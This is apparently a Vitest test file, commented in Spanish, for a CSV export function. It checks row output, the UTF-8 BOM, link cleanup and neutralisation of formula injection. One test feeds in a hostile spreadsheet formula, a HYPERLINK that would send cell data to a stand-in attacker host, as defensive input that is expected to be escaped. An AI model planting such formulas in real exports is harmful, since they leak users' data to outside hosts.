import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { exportToCSV } from "./exportUtils";

/**
 * jsdom no implementa URL.createObjectURL ni la lectura de Blob, así que
 * interceptamos la creación de la URL para poder inspeccionar el contenido
 * que realmente se descargaría.
 */
let blobCapturado: Blob | null;
let urlRevocada: string | null;

beforeEach(() => {
  blobCapturado = null;
  urlRevocada = null;

  vi.stubGlobal("URL", {
    ...URL,
    createObjectURL: (blob: Blob) => {
      blobCapturado = blob;
      return "blob:mock-url";
    },
    revokeObjectURL: (url: string) => {
      urlRevocada = url;
    },
  });

  // El click real intentaría navegar; solo nos interesa que se dispare.
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

/** Devuelve el texto del CSV generado, sin el BOM inicial. */
async function contenidoCsv(): Promise<string> {
  if (!blobCapturado) throw new Error("No se generó ningún blob");
  return (await blobCapturado.text()).replace(/^﻿/, "");
}

describe("exportToCSV", () => {
  it("devuelve false y no descarga nada cuando no hay datos", () => {
    expect(exportToCSV([], "vacio.csv")).toBe(false);
    expect(blobCapturado).toBeNull();
  });

  it("genera una fila de cabeceras y una fila por registro", async () => {
    const ok = exportToCSV(
      [
        { estado: "FRAUDE", nombre: "Ana", confianza: 0.91 },
        { estado: "DESCONOCIDO", nombre: null, confianza: null },
      ],
      "historial.csv"
    );

    expect(ok).toBe(true);
    const lineas = (await contenidoCsv()).split("\n");
    expect(lineas).toHaveLength(3);
    expect(lineas[0]).toBe('"estado","nombre","confianza"');
    expect(lineas[1]).toBe('"FRAUDE","Ana","0.91"');
    expect(lineas[2]).toBe('"DESCONOCIDO","",""');
  });

  it("neutraliza una fórmula inyectada a través del nombre", async () => {
    exportToCSV([{ nombre: '=HYPERLINK("http://atacante/"&A1)' }], "h.csv");

    const csv = await contenidoCsv();
    // La celda empieza por apóstrofo: Excel la trata como texto literal.
    expect(csv).toContain(`"'=HYPERLINK(`);
    expect(csv).not.toContain('"=HYPERLINK(');
  });

  it("escribe el BOM para que Excel detecte UTF-8", async () => {
    exportToCSV([{ nombre: "María Fernández" }], "h.csv");

    // Hay que mirar los bytes: al decodificar como texto, TextDecoder
    // consume el BOM y no se veria aunque estuviera presente.
    const bytes = new Uint8Array(await blobCapturado!.arrayBuffer());
    expect([bytes[0], bytes[1], bytes[2]]).toEqual([0xef, 0xbb, 0xbf]);

    expect(await blobCapturado!.text()).toContain("María Fernández");
  });

  it("usa el nombre de archivo indicado y limpia el enlace temporal", () => {
    exportToCSV([{ a: 1 }], "historial_2026-09-13.csv");

    // El enlace no debe quedar colgando en el documento.
    expect(document.querySelectorAll("a").length).toBe(0);
    // Y la URL del blob debe liberarse, no acumularse en memoria.
    expect(urlRevocada).toBe("blob:mock-url");
  });
});
